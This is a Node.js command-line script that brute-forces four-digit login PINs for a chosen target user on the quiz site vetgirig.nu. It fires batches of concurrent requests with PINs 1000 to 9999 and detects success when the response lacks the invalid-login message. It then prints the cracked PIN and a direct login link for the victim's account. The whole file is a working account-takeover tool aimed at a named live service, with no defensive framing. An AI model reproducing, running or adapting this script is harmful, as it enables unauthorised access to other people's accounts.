const client = require('axios')
const inquirer = require('inquirer')
const chalk = require('chalk')
const clear = require('clear')
const Progress = require('clui').Progress
const MAX_PIN = 9999
const COOLDOWN_MS = 2000

function numberValidator(text) {
  if (Number.isNaN(Number(text)) || !text) return 'Must be a number'
  return true
}

const questions = [
  {
    type: 'input',
    name: 'league',
    message: chalk.green('League ID'),
    validate: numberValidator,
    default: 18131
  },
  {
    type: 'input',
    name: 'match',
    message: chalk.green('Match ID'),
    validate: numberValidator
  },
  {
    type: 'input',
    name: 'user',
    message: chalk.green('Target user')
  },
  {
    type: 'input',
    name: 'concurrency',
    message: chalk.green('Number of concurrent requests'),
    validate: numberValidator,
    default: 40
  }
]

const progressBar = new Progress(20)
let foundPin = false

clear()

inquirer.prompt(questions).then(({ concurrency, league, match, user }) => {
  concurrency = Number(concurrency)

  function run(start, end) {
    if (!end) end = start + concurrency
    if (!foundPin && end <= MAX_PIN) {
      for (i = start; i < end; i++) {
        call(user, i)
      }

      clear()
      console.log(chalk.blue(`Trying PINs ${start} - ${end}`))
      console.log(progressBar.update(((end - 999) / MAX_PIN).toFixed(2)))
      setTimeout(() => run(start + concurrency, end + concurrency), COOLDOWN_MS)
    }
  }

  function call(user, pin) {
    client
      .get(
        `https://www.vetgirig.nu/qlm.php?chno=${match}&lid=${league}&pin=${pin}&id=${user}`,
        { responseType: 'text' }
      )
      .then(({ data }) => {
        if (data.indexOf('Ogiltig l') === -1) {
          foundPin = true
          const loginUrl = `https://www.vetgirig.nu/qlm.php?chno=${match}&lid=${league}&pin=${pin}&id=${user}`
          clear()
          console.log(`Found PIN ${chalk.green(pin)} for user ${user}`)
          console.log(`Login using this link: ${chalk.blue(loginUrl)}`)
        }
      })
      .catch(e =>
        console.error(chalk.red(`Error while trying PIN ${pin}: ${e.message}`))
      )
  }

  run(1000)
})
